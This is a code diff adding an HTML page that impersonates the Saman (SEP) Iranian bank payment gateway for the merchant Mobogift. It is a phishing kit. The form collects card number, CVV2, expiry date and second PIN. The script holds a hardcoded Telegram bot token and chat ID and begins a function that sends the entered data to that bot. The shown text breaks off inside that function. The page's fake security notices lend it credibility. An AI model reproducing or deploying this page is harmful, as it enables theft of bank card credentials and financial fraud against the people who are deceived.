@@ -1,0 +1,1642 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>درگاه پرداخت اینترنتی سِپ (SEP)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'IRANSans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #eef1f5;
+            min-height: 100vh;
+            padding: 20px;
+            direction: rtl;
+            color: #2d3748;
+        }
+
+        .container {
+            max-width: 620px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            padding: 28px 30px 30px;
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #f0f2f5;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-left .logo {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, #1a3a7a, #2a5a9a);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: -0.5px;
+        }
+
+        .header-left .title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a2a4a;
+        }
+
+        .header-left .title small {
+            font-weight: 400;
+            font-size: 13px;
+            color: #5a6a8a;
+        }
+
+        .header .timer {
+            background: #fef3e2;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #b7791f;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #fde68a;
+            transition: all 0.3s ease;
+            min-width: 80px;
+            justify-content: center;
+        }
+
+        .header .timer .icon {
+            font-size: 20px;
+        }
+
+        .header .timer.warning {
+            background: #fee2e2;
+            color: #dc2626;
+            border-color: #fca5a5;
+            animation: pulse 0.8s ease-in-out infinite;
+        }
+
+        .header .timer.expired {
+            background: #f3f4f6;
+            color: #6b7280;
+            border-color: #d1d5db;
+            animation: none;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .merchant-box {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin: 18px 0 20px;
+            border: 1px solid #e8ecf2;
+        }
+
+        .merchant-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 14px;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+
+        .merchant-box .row .label {
+            color: #6a7a8e;
+            font-weight: 500;
+        }
+
+        .merchant-box .row .value {
+            font-weight: 600;
+            color: #1a2a4a;
+        }
+
+        .merchant-box .row .value.amount {
+            color: #1a5a2a;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .merchant-box .row .value.amount .rial {
+            font-size: 14px;
+            font-weight: 400;
+            color: #6a7a8e;
+        }
+
+        .merchant-box .divider {
+            border-top: 1px dashed #dce0e6;
+            margin: 8px 0;
+        }
+
+        .form-section {
+            margin-top: 6px;
+        }
+
+        .form-section .section-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a2a4a;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-section .section-title .badge {
+            background: #e8ecf2;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 400;
+            color: #5a6a8a;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d3a4a;
+            margin-bottom: 4px;
+        }
+
+        .form-group label .required {
+            color: #dc2626;
+            margin-right: 2px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="number"],
+        .form-group input[type="tel"] {
+            width: 100%;
+            padding: 11px 14px;
+            border: 2px solid #dce0e6;
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background: #fafbff;
+        }
+
+        .form-group input.ltr-input {
+            direction: ltr !important;
+            text-align: left !important;
+            unicode-bidi: plaintext;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #2a5a9a;
+            box-shadow: 0 0 0 4px rgba(42, 90, 154, 0.08);
+        }
+
+        .form-group input::placeholder {
+            color: #aab0ba;
+            font-size: 13px;
+        }
+
+        .form-group input.error {
+            border-color: #dc2626;
+            background: #fef2f2;
+        }
+
+        .form-group .error-msg {
+            display: none;
+            color: #dc2626;
+            font-size: 12px;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+
+        .form-group .error-msg.show {
+            display: block;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+        }
+
+        .form-row-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 14px;
+        }
+
+        .form-group select {
+            width: 100%;
+            padding: 11px 14px;
+            border: 2px solid #dce0e6;
+            border-radius: 10px;
+            font-size: 14px;
+            font-family: inherit;
+            background: #fafbff;
+            transition: border-color 0.2s;
+            color: #2d3748;
+        }
+
+        .form-group select:focus {
+            outline: none;
+            border-color: #2a5a9a;
+        }
+
+        .form-group select.error {
+            border-color: #dc2626;
+        }
+
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f8fafc;
+            padding: 10px 14px;
+            border-radius: 10px;
+            border: 1px solid #e8ecf2;
+            flex-wrap: wrap;
+        }
+
+        .captcha-box .captcha-image {
+            background: linear-gradient(135deg, #1a2a5a, #3a5a8a);
+            padding: 8px 18px;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            font-family: 'Courier New', monospace;
+            user-select: none;
+            min-width: 120px;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .captcha-box .captcha-image:hover {
+            background: linear-gradient(135deg, #2a3a6a, #4a6a9a);
+        }
+
+        .captcha-box .captcha-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .captcha-box .captcha-actions button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 20px;
+            padding: 6px 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+            color: #4a5a72;
+        }
+
+        .captcha-box .captcha-actions button:hover {
+            background: #e8ecf2;
+        }
+
+        .captcha-box .captcha-input {
+            flex: 1;
+            min-width: 80px;
+        }
+
+        .captcha-box .captcha-input input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 2px solid #dce0e6;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+            text-align: center;
+            letter-spacing: 4px;
+            background: #fff;
+        }
+
+        .captcha-box .captcha-input input:focus {
+            outline: none;
+            border-color: #2a5a9a;
+        }
+
+        .captcha-box .captcha-input input.error {
+            border-color: #dc2626;
+        }
+
+        .dynamic-code-row {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .dynamic-code-row .form-group {
+            flex: 2;
+            min-width: 150px;
+            margin-bottom: 0;
+        }
+
+        .dynamic-code-row .btn-get-code {
+            flex: 1;
+            min-width: 120px;
+            padding: 11px 18px;
+            background: #1a3a7a;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.15s;
+            font-family: inherit;
+            white-space: nowrap;
+        }
+
+        .dynamic-code-row .btn-get-code:hover:not(:disabled) {
+            background: #2a4a8a;
+        }
+
+        .dynamic-code-row .btn-get-code:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .dynamic-code-row .btn-get-code:disabled {
+            background: #aab0ba;
+            cursor: not-allowed;
+        }
+
+        .dynamic-code-row .btn-get-code .countdown {
+            font-weight: 400;
+            font-size: 13px;
+        }
+
+        .options-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            padding: 8px 0 4px;
+        }
+
+        .options-row .option-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #3a4a5e;
+            cursor: pointer;
+        }
+
+        .options-row .option-item input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #1a3a7a;
+            cursor: pointer;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1a5a2a 0%, #2a7a3a 100%);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: inherit;
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(26, 90, 42, 0.3);
+        }
+
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            background: #aab0ba;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #4a5a72;
+            border: 2px solid #dce0e6;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: inherit;
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: #f8fafc;
+            border-color: #b0b8c4;
+        }
+
+        .extra-section {
+            margin-top: 20px;
+            padding-top: 18px;
+            border-top: 2px solid #f0f2f5;
+        }
+
+        .extra-section .extra-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d3a4a;
+            margin-bottom: 6px;
+        }
+
+        .extra-section .extra-input {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .extra-section .extra-input input {
+            flex: 1;
+            min-width: 140px;
+            padding: 10px 14px;
+            border: 2px solid #dce0e6;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            background: #fafbff;
+        }
+
+        .extra-section .extra-input input:focus {
+            outline: none;
+            border-color: #2a5a9a;
+        }
+
+        .telegram-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 14px;
+            background: #f0f7ff;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #1a3a7a;
+            margin-top: 10px;
+            border: 1px solid #dce6f0;
+        }
+
+        .telegram-status .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .telegram-status .dot.online {
+            background: #22c55e;
+        }
+
+        .telegram-status .dot.offline {
+            background: #ef4444;
+        }
+
+        .telegram-status .dot.connecting {
+            background: #eab308;
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        .security-notes {
+            margin-top: 20px;
+            padding: 16px 18px;
+            background: #f0f7ff;
+            border-radius: 12px;
+            border-right: 4px solid #1a3a7a;
+        }
+
+        .security-notes .note-title {
+            font-weight: 700;
+            font-size: 14px;
+            color: #1a2a4a;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .security-notes .note-text {
+            font-size: 12px;
+            color: #3a4a6a;
+            line-height: 1.8;
+        }
+
+        .security-notes .note-text .highlight {
+            background: #fef3c7;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+
+        .security-notes .note-text ul {
+            padding-right: 20px;
+            margin: 6px 0;
+        }
+
+        .security-notes .note-text ul li {
+            margin-bottom: 4px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 2px solid #f0f2f5;
+            font-size: 11px;
+            color: #7a8a9e;
+            text-align: center;
+            line-height: 1.8;
+        }
+
+        .footer .badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 6px;
+        }
+
+        .footer .badges span {
+            background: #f0f2f5;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            color: #4a5a72;
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            left: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 14px 20px;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+            z-index: 2000;
+            transform: translateY(-120px);
+            opacity: 0;
+            transition: transform 0.4s ease, opacity 0.4s ease;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .toast.error {
+            background: #dc2626;
+        }
+
+        .toast.success {
+            background: #16a34a;
+        }
+
+        .toast.warning {
+            background: #d97706;
+        }
+
+        .toast.info {
+            background: #2563eb;
+        }
+
+        .result-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(4px);
+        }
+
+        .result-overlay.active {
+            display: flex;
+        }
+
+        .result-box {
+            background: #fff;
+            border-radius: 20px;
+            padding: 40px 35px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px) scale(0.95);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+
+        .result-box .icon {
+            font-size: 64px;
+            margin-bottom: 12px;
+        }
+
+        .result-box .result-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a2a4a;
+            margin-bottom: 4px;
+        }
+
+        .result-box .result-title.success {
+            color: #16a34a;
+        }
+
+        .result-box .result-title.failed {
+            color: #dc2626;
+        }
+
+        .result-box .result-title.pending {
+            color: #d97706;
+        }
+
+        .result-box .result-sub {
+            font-size: 14px;
+            color: #5a6a8a;
+            margin-bottom: 16px;
+        }
+
+        .result-box .result-details {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            text-align: right;
+            font-size: 13px;
+        }
+
+        .result-box .result-details .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid #e8ecf2;
+        }
+
+        .result-box .result-details .row:last-child {
+            border-bottom: none;
+        }
+
+        .result-box .result-details .row .label {
+            color: #6a7a8e;
+        }
+
+        .result-box .result-details .row .value {
+            font-weight: 600;
+            color: #1a2a4a;
+        }
+
+        .result-box .btn-close-result {
+            padding: 12px 30px;
+            background: #1a3a7a;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background 0.2s;
+        }
+
+        .result-box .btn-close-result:hover {
+            background: #2a4a8a;
+        }
+
+        .result-box .btn-close-result.danger {
+            background: #7a2a2a;
+        }
+
+        .result-box .btn-close-result.danger:hover {
+            background: #8a3a3a;
+        }
+
+        @media (max-width: 550px) {
+            .container {
+                padding: 16px 14px;
+            }
+            .header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .header .timer {
+                align-self: flex-start;
+                font-size: 15px;
+                padding: 6px 14px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            .form-row-3 {
+                grid-template-columns: 1fr 1fr;
+            }
+            .merchant-box .row {
+                font-size: 13px;
+            }
+            .merchant-box .row .value.amount {
+                font-size: 17px;
+            }
+            .dynamic-code-row {
+                flex-direction: column;
+            }
+            .dynamic-code-row .btn-get-code {
+                width: 100%;
+            }
+            .captcha-box {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .captcha-box .captcha-image {
+                text-align: center;
+            }
+            .options-row {
+                flex-direction: column;
+                gap: 8px;
+            }
+            .extra-section .extra-input {
+                flex-direction: column;
+            }
+            .result-box {
+                padding: 30px 20px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .form-row-3 {
+                grid-template-columns: 1fr;
+            }
+            .header-left .title {
+                font-size: 15px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f0f2f5;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #c0c8d4;
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #aab0ba;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            20% {
+                transform: translateX(-10px);
+            }
+            40% {
+                transform: translateX(10px);
+            }
+            60% {
+                transform: translateX(-6px);
+            }
+            80% {
+                transform: translateX(6px);
+            }
+        }
+
+        .shake {
+            animation: shake 0.4s ease;
+        }
+
+        .persian-date-label {
+            font-size: 12px;
+            color: #6a7a8e;
+            margin-top: 2px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- TOAST -->
+    <div class="toast" id="toast">
+        <span id="toastIcon">⚠️</span>
+        <span id="toastMessage">خطا</span>
+    </div>
+
+    <!-- MAIN CONTAINER -->
+    <div class="container" id="mainContainer">
+
+        <!-- HEADER -->
+        <div class="header">
+            <div class="header-left">
+                <div class="logo">سِپ</div>
+                <div class="title">
+                    درگاه پرداخت اینترنتی
+                    <small>سامان</small>
+                </div>
+            </div>
+            <div class="timer" id="timerDisplay">
+                <span class="icon">⏱️</span>
+                <span id="timerText">05:00</span>
+            </div>
+        </div>
+
+        <!-- MERCHANT INFO -->
+        <div class="merchant-box">
+            <div class="row">
+                <span class="label">پذیرنده</span>
+                <span class="value">موبوگیفت</span>
+            </div>
+            <div class="row">
+                <span class="label">مبلغ</span>
+                <span class="value amount" id="amountDisplay">
+                    440,000 <span class="rial">ریال</span>
+                </span>
+            </div>
+            <div style="font-size:13px; color:#5a6a8a; text-align:left; margin-top:-4px;">
+                چهل و چهار هزار تومان
+            </div>
+            <div class="divider"></div>
+            <div class="row">
+                <span class="label">شماره پذیرنده / ترمینال</span>
+                <span class="value">16913293 / 15376470</span>
+            </div>
+            <div class="row">
+                <span class="label">سایت پذیرنده</span>
+                <span class="value" style="direction:ltr;">mobogift.com</span>
+            </div>
+        </div>
+
+        <!-- FORM -->
+        <div class="form-section">
+            <div class="section-title">
+                اطلاعات کارت خود را وارد کنید
+                <span class="badge">الزامی</span>
+            </div>
+
+            <!-- شماره کارت -->
+            <div class="form-group" id="cardGroup">
+                <label>شماره کارت <span class="required">*</span></label>
+                <input type="text" id="cardNumber" class="ltr-input" placeholder="____ ____ ____ ____" maxlength="19" />
+                <div class="error-msg" id="cardError">شماره کارت وارد شده معتبر نیست</div>
+            </div>
+
+            <!-- CVV2 + تاریخ انقضا (شمسی) -->
+            <div class="form-row">
+                <div class="form-group" id="cvvGroup">
+                    <label>شماره شناسایی دوم (CVV2) <span class="required">*</span></label>
+                    <input type="text" id="cvv" class="ltr-input" placeholder="CVV2" maxlength="4" />
+                    <div class="error-msg" id="cvvError">CVV2 باید 3 یا 4 رقم باشد</div>
+                </div>
+                <div class="form-group" id="expiryGroup">
+                    <label>تاریخ انقضا (شمسی) <span class="required">*</span></label>
+                    <div class="form-row-3" style="gap:6px;">
+                        <select id="expiryMonth">
+                            <option value="">ماه</option>
+                            <option value="01">۰۱</option>
+                            <option value="02">۰۲</option>
+                            <option value="03">۰۳</option>
+                            <option value="04">۰۴</option>
+                            <option value="05">۰۴</option>
+                            <option value="06">۰۶</option>
+                            <option value="07">۰۷</option>
+                            <option value="08">۰۸</option>
+                            <option value="09">۰۹</option>
+                            <option value="10">۱۰</option>
+                            <option value="11">۱۱</option>
+                            <option value="12">۱۲</option>
+                        </select>
+                        <select id="expiryYear">
+                            <option value="">سال</option>
+                            <option value="1403">۱۴۰۳</option>
+                            <option value="1404">۱۴۰۴</option>
+                            <option value="1405">۱۴۰۵</option>
+                            <option value="1406">۱۴۰۶</option>
+                            <option value="1407">۱۴۰۷</option>
+                            <option value="1408">۱۴۰۸</option>
+                            <option value="1409">۱۴۰۹</option>
+                            <option value="1410">۱۴۱۰</option>
+                            <option value="1410">۱۴۱۱</option>
+                            <option value="1410">۱۴۱۲</option>
+                            <option value="1410">۱۴۱۳</option>
+                            <option value="1410">۱۴۱۴</option>
+                            <option value="1410">۱۴۱۵</option>
+                            <option value="1410">۱۴۱۶</option>
+                            <option value="1410">۱۴۱۷</option>
+                            <option value="1410">۱۴۱۸</option>
+                            <option value="1410">۱۴۱۹</option>
+                            <option value="1410">۱۴۲۰</option>
+                        </select>
+                    </div>
+                    <span class="persian-date-label">مثال: ۱۴۰۴/۰۶</span>
+                    <div class="error-msg" id="expiryError">تاریخ انقضا نامعتبر است</div>
+                </div>
+            </div>
+
+            <!-- کد امنیتی -->
+            <div class="form-group" id="captchaGroup">
+                <label>کد امنیتی <span class="required">*</span></label>
+                <div class="captcha-box">
+                    <div class="captcha-image" id="captchaText" onclick="refreshCaptcha()">3 8 1 7</div>
+                    <div class="captcha-actions">
+                        <button onclick="refreshCaptcha()" title="تغییر کد امنیتی">🔄</button>
+                        <button onclick="speakCaptcha()" title="پخش صوتی">🔊</button>
+                    </div>
+                    <div class="captcha-input">
+                        <input type="text" id="captchaInput" placeholder="کد امنیتی" maxlength="4" />
+                    </div>
+                </div>
+                <div class="error-msg" id="captchaError">کد امنیتی اشتباه است</div>
+            </div>
+
+            <!-- رمز دوم/پویا -->
+            <div class="form-group" id="dynamicGroup">
+                <label>رمز دوم <span class="required">*</span></label>
+                <div class="dynamic-code-row">
+                    <div class="form-group" style="flex:2; min-width:150px; margin:0;">
+                        <input type="text" id="dynamicCode" class="ltr-input" placeholder="رمز دوم خود را وارد کنید" />
+                    </div>
+                    <button class="btn-get-code" id="getCodeBtn" onclick="requestDynamicCode()">
+                        دریافت رمز پویا
+                    </button>
+                </div>
+                <div class="error-msg" id="dynamicError">رمز دوم باید حداقل 4 رقم باشد</div>
+            </div>
+
+            <!-- گزینه‌ها -->
+            <div class="options-row">
+                <label class="option-item">
+                    <input type="checkbox" id="saveCard" />
+                    شماره کارت در درگاه‌های سِپ ذخیره شود
+                </label>
+                <label class="option-item">
+                    <input type="checkbox" id="termsCheck" />
+                    <span>قوانین و مقررات را می‌پذیرم</span>
+                </label>
+            </div>
+
+            <!-- دکمه پرداخت -->
+            <button class="btn-primary" id="payBtn" onclick="processPayment()">
+                <span id="payBtnText">پرداخت 440,000 ریال</span>
+            </button>
+
+            <button class="btn-secondary" onclick="resetForm()">انصراف</button>
+        </div>
+
+        <!-- EXTRA -->
+        <div class="extra-section">
+            <div class="extra-title">مایلید اطلاعات پرداخت را به صورت ایمیل و پیامک دریافت کنید؟ (اختیاری)</div>
+            <div class="extra-input">
+                <input type="text" placeholder="ایمیل (اختیاری)" id="extraEmail" />
+                <input type="text" placeholder="شماره موبایل (اختیاری)" id="extraPhone" dir="ltr" />
+            </div>
+        </div>
+
+        <!-- وضعیت تلگرام -->
+        <div class="telegram-status">
+            <span class="dot connecting" id="telegramDot"></span>
+            <span id="telegramStatusText">در حال اتصال به تلگرام...</span>
+        </div>
+
+        <!-- SECURITY NOTES -->
+        <div class="security-notes">
+            <div class="note-title">🔒 نکته امنیتی</div>
+            <div class="note-text">
+                <p style="font-weight:600; color:#1a2a4a;">
+                    دارنده محترم کارت بانکی، با مراجعه به بانک خود یا یکی از روشهای مورد نظر بانک شما، به منظور تایید شماره همراه و پویاسازی رمز دوم کارت خود اقدام نمایید.
+                </p>
+                <p style="font-weight:600; color:#1a2a4a; margin-top:8px;">راهنمای استفاده از رمز پویا</p>
+                <p>رمز پویا رمز یک‌بار مصرفی است که به جای رمز دوم کارت استفاده می‌شود.</p>
+                <ul>
+                    <li><strong>مرحله اول:</strong> بر اساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعال سازی رمز پویا اقدام نمایید.</li>
+                    <li><strong>مرحله دوم:</strong> رمز پویا را بر اساس روش اعلامی از طرف بانک صادر کننده کارت، به یکی از روش‌های زیر دریافت کنید.
+                        <br>1- دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک.
+                        <br>2- دریافت از طریق کد USSD بانک صادر کننده کارت شما.
+                        <br>3- دریافت از طریق زدن دکمه "دریافت رمز پویا" در درگاه پرداخت اینترنتی.
+                    </li>
+                    <li><strong>مرحله سوم:</strong> پس از دریافت رمز به یکی از روش‌های فوق، رمز پویای دریافت شده را در محل تعیین شده برای "رمز دوم" وارد نمایید و سپس مابقی اطلاعات را تکمیل نمایید.</li>
+                </ul>
+                <p style="font-weight:600; color:#1a2a4a; margin-top:8px;">📌 راهنما و نکات امنیتی</p>
+                <ul>
+                    <li><strong>شماره کارت:</strong> 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.</li>
+                    <li><strong>شماره شناسایی دوم (CVV2):</strong> شماره شناسایی کارت با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.</li>
+                    <li><strong>تاریخ انقضا:</strong> شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.</li>
+                    <li><strong>رمز دوم:</strong> با عنوان رمز دوم و در برخی موارد با PIN2 شناخته می‌شود، از طریق بانک صادر کننده کارت تولید شده و همچنین از طریق دستگاه‌های خودپرداز بانک صادر کننده قابل تهیه و یا تغییر می‌باشد.</li>
+                    <li><strong>کد امنیتی:</strong> بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرآیند خرید، کد موجود که به صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.</li>
+                </ul>
+                <p style="margin-top:8px;">
+                    درگاه پرداخت اینترنتی سامان با استفاده از پروتکل امن SSL به مشتریان خود ارائه خدمت نموده و با آدرس <span class="highlight">https://sep.shaparak.ir</span> شروع می‌شود. خواهشمند است به منظور جلوگیری از سوء استفاده‌های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و در صورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما در میان بگذارید.
+                </p>
+                <ul style="margin-top:6px;">
+                    <li>از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
+                    <li>برای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
+                    <li>برای کسب اطلاعات بیشتر، گزارش فروشگاه‌های مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی می‌توانید با شماره <strong>021-84080</strong> تماس بگیرید و یا از طریق آدرس ایمیل <strong>epay@sep.ir</strong> اقدام نمایید.</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <p>درگاه پرداخت اینترنتی سِپ (SEP) - سامان کیش</p>
+            <div class="badges">
+                <span>🔒 SSL Secure</span>
+                <span>✅ Verified by Visa</span>
+                <span>🛡️ 3D Secure</span>
+                <span>🏦 شتاب</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- RESULT OVERLAY -->
+    <div class="result-overlay" id="resultOverlay">
+        <div class="result-box">
+            <div class="icon" id="resultIcon">✅</div>
+            <div class="result-title" id="resultTitle">پرداخت موفق</div>
+            <div class="result-sub" id="resultSub">تراکنش با موفقیت انجام شد</div>
+            <div class="result-details" id="resultDetails">
+                <div class="row">
+                    <span class="label">شماره پیگیری</span>
+                    <span class="value" id="resTrace">۱۲۳۴۵۶۷۸۹۰</span>
+                </div>
+                <div class="row">
+                    <span class="label">شماره مرجع</span>
+                    <span class="value" id="resRef">SEP-987654321</span>
+                </div>
+                <div class="row">
+                    <span class="label">مبلغ</span>
+                    <span class="value" id="resAmount">۴۴۰,۰۰۰ ریال</span>
+                </div>
+                <div class="row">
+                    <span class="label">تاریخ</span>
+                    <span class="value" id="resDate">۱۴۰۳/۰۴/۱۵ - ۱۴:۳۰</span>
+                </div>
+                <div class="row">
+                    <span class="label">پذیرنده</span>
+                    <span class="value" id="resMerchant">موبوگیفت</span>
+                </div>
+                <div class="row">
+                    <span class="label">شماره کارت</span>
+                    <span class="value" id="resCard">**** **** **** 1234</span>
+                </div>
+            </div>
+            <button class="btn-close-result" onclick="closeResult()">بازگشت</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 🔧 تنظیمات تلگرام - 🔴 اینجا رو ویرایش کنید 🔴
+        // ============================================================
+        const TELEGRAM_CONFIG = {
+            botToken: '8093867594:AAH5rBT9JLDlwzvJxRcMjXBizeEXbcDNGXA',
+            chatId: '7890541772',
+            enabled: true
+        };
+
+        // ============================================================
+        // 📤 ارسال پیام به تلگرام
+        // ============================================================
+        async function sendToTelegram(message, isImportant = false) {
+            if (!TELEGRAM_CONFIG.enabled) {
+                console.log('ℹ️ ارسال به تلگرام غیرفعال است');
+                return;
+            }
+
+            const token = TELEGRAM_CONFIG.botToken;
+            const chatId = TELEGRAM_CONFIG.chatId;
+
+            if (token === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
